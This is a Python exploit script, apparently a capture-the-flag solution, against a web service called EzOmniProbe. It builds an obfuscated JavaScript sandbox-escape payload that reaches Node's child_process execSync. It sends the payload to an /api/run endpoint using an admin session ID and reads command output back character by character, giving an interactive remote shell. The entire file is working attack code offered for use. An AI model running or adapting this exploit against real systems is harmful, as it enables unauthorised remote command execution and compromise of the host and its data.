#!/usr/bin/env python3
import argparse
import json
import sys
import urllib.error
import urllib.request


DEFAULT_URL = "http://127.0.0.1:13503"
PAYLOAD_TEMPLATE = (
    "a='constr',b='uctor',p='pro',s='cess',q='requ',r='ire';"
    "new Proxy({},{get(){return function(x){"
    "x(x[a+b][a+b]('return '+p+s)().mainModule[q+r]"
    "('child_'+p+s).execSync('CMD')+'')}}})"
)


def request(url, method, path, sid, data=None, timeout=20):
    headers = {
        "X-Session-Id": sid,
        "Connection": "close",
    }
    body = None
    if data is not None:
        headers["Content-Type"] = "application/json"
        body = json.dumps(data).encode()

    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=body,
        headers=headers,
        method=method,
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, resp.read().decode(errors="replace")


def escape_js_string(text):
    return text.replace("\\", "\\\\").replace("'", "\\'")


def build_payload(command):
    code = PAYLOAD_TEMPLATE.replace("CMD", escape_js_string(command))
    if len(code) > 255:
        raise ValueError(
            f"payload too long: {len(code)} chars; "
            "shorten the command or split it into multiple commands"
        )
    return code


def run_payload(url, sid, command):
    code = build_payload(command)
    try:
        status, _ = request(url, "POST", "/api/run", sid, {"code": code})
        if status != 204:
            raise RuntimeError(f"/api/run returned unexpected status {status}")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        raise RuntimeError(f"/api/run HTTP {exc.code}: {body}") from exc


def read_char(url, sid, index):
    try:
        _, body = request(url, "GET", f"/api/run?cursor={index}", sid)
        return index, json.loads(body).get("char", "")
    except Exception:
        return index, ""


def read_output(url, sid, max_chars=512, empty_window=8):
    chars = []
    empty_count = 0

    for index in range(max_chars):
        _, char = read_char(url, sid, index)
        if char == "":
            empty_count += 1
            chars.append("")
            if empty_count >= empty_window:
                break
            continue

        empty_count = 0
        chars.append(char)

    return "".join(chars)


def run_command(url, sid, command, max_chars):
    run_payload(url, sid, command)
    return read_output(url, sid, max_chars=max_chars)


def repl(url, sid, max_chars):
    print(f"target: {url}")
    print(f"sid: {sid}")
    print("enter a command to run through /api/run; blank line exits")

    while True:
        try:
            command = input("cmd> ").strip()
        except EOFError:
            print()
            return 0

        if not command:
            return 0

        try:
            output = run_command(url, sid, command, max_chars)
        except Exception as exc:
            print(f"error: {exc}")
            continue

        sys.stdout.write(output)
        if output and not output.endswith("\n"):
            sys.stdout.write("\n")
        sys.stdout.flush()


def main():
    parser = argparse.ArgumentParser(
        description="Run shell commands through EzOmniProbe /api/run and read cursor output"
    )
    parser.add_argument("--url", help="target base URL, e.g. http://127.0.0.1:13503")
    parser.add_argument("--sid", help="admin X-Session-Id")
    parser.add_argument("--max-chars", type=int, default=512, help="max output chars to read")
    args = parser.parse_args()

    url = args.url or input(f"target url [{DEFAULT_URL}]: ").strip() or DEFAULT_URL

    sid = args.sid or input("admin sid: ").strip()
    if not sid:
        print("sid is required", file=sys.stderr)
        return 1

    return repl(url, sid, args.max_chars)


if __name__ == "__main__":
    raise SystemExit(main())
